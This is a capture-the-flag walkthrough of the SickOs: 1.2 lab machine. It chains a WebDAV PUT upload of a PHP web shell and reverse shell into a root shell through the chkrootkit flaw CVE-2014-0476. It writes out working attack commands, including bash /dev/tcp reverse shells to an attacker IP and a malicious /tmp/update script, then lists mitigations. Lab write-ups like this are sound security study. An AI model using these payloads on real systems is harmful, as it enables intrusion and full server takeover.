# SickOs: 1.2 — Walkthrough

| Field | Detail |
|---|---|
| Machine | SickOs: 1.2 |
| Series | SickOs |
| Author | D4rk |
| Release Date | 27 Apr 2016 |
| OS | Linux |

## 🔍 Overview

SickOs: 1.2 is a Linux machine involving WebDAV misconfiguration abuse for direct file upload (leading to RCE via a PHP web shell and reverse shell), followed by privilege escalation through an outdated, vulnerable `chkrootkit` package (CVE-2014-0476) triggered by a hidden root cron job.

---

## Step 1 – Reconnaissance

```bash
nmap -A -T5 192.168.1.8
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH |
| 80/tcp | HTTP — lighttpd |

---

## Step 2 – Web Enumeration

```bash
gobuster dir -u http://192.168.1.8 -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/test` directory, with WebDAV enabled.

---

## Step 3 – WebDAV Check

```bash
curl --head -X OPTIONS http://192.168.1.8/test/
```

**Result:** `PUT` method confirmed as allowed — indicating file upload was possible via WebDAV.

---

## Step 4 – PHP Shell Upload

```bash
echo '<?php echo shell_exec("id"); ?>' > test_cmd.php
curl -X PUT -H "Expect: " http://192.168.1.8/test/test_cmd.php -d @test_cmd.php
curl -s http://192.168.1.8/test/test_cmd.php
```

**Result:** Output showed `uid=33(www-data)` — confirming successful PHP code execution.

---

## Step 5 – Reverse Shell Upload

```bash
cat > revshell.php << 'EOF'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'"); ?>
EOF
curl -X PUT -H "Expect: " http://192.168.1.8/test/revshell.php -d @revshell.php
```

---

## Step 6 – Listener & Trigger

```bash
# Terminal 1
nc -lvnp 443

# Terminal 2
curl -s http://192.168.1.8/test/revshell.php
```

**Result:** Reverse shell received as `www-data`.

---

## Step 7 – Privilege Escalation Research (CVE-2014-0476)

```bash
dpkg -l | grep chkrootkit
```

**Result:** `chkrootkit` version `0.49` identified — vulnerable to CVE-2014-0476, which allows arbitrary code execution as root via `/tmp/update` when `chkrootkit` runs.

**Prepared the payload:**

```bash
echo '#!/bin/bash' > /tmp/update
echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' >> /tmp/update
chmod +x /tmp/update
```

---

## Step 8 – Root Shell via Cron-Triggered chkrootkit

```bash
nc -lvnp 4444
```

A hidden cron entry under `/etc/cron.d/` runs `chkrootkit` as root every minute, which in turn executes `/tmp/update` — triggering the reverse shell as root.

**Result:** Root shell obtained.

---

## Step 9 – Flag Capture

```bash
id
cat /root/*.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. WebDAV enabled with the `PUT` method allowed, permitting direct file upload and remote code execution
2. Outdated, vulnerable `chkrootkit` (0.49) package — CVE-2014-0476
3. A root-owned cron job silently executed `chkrootkit` every minute, invisible to the low-privileged `www-data` user, creating a reliable privilege escalation trigger

## 🩹 Mitigations

1. Disable WebDAV or restrict HTTP methods (`PUT`, `DELETE`) on production web servers
2. Keep all system packages patched and up to date, especially security tooling like `chkrootkit`
3. Regularly audit `/etc/cron.d/` and other cron locations for unexpected or hidden entries
4. Apply the principle of least privilege — avoid running maintenance/security tools as root where avoidable
5. Monitor for unauthorized file writes to sensitive paths like `/tmp`

---

## 🧰 Tools Used

`nmap` · `gobuster` · `curl` · `netcat` · `chkrootkit exploit (CVE-2014-0476)`

## 🧠 Techniques Covered

Network scanning · Web enumeration · WebDAV/HTTP PUT abuse · PHP web shell upload · Reverse shell handling · Known-CVE privilege escalation · Cron job abuse

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Reconnaissance | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | WebDAV Check | ✅ |
| 4 | PHP Shell Upload | ✅ |
| 5 | Reverse Shell Upload | ✅ |
| 6 | Listener & Trigger | ✅ |
| 7 | Privilege Escalation Research (CVE-2014-0476) | ✅ |
| 8 | Root Shell via Cron-Triggered chkrootkit | ✅ |
| 9 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "SickOs" series.*
